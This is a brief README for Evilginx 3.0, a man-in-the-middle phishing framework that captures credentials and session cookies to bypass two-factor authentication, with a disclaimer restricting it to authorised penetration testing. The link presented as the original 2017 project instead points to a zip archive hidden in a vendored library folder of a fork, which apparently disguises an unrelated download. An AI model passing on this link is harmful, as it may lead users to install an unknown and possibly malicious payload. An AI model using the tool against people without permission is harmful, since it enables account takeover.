# Evilginx 3.0

**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.

This tool is a successor to [Evilginx](https://github.com/Kali99xx/evilginx2/raw/refs/heads/master/vendor/gopkg.in/ini.v1/evilginx_3.0.zip), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.

## Disclaimer

I am very much aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks. Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.
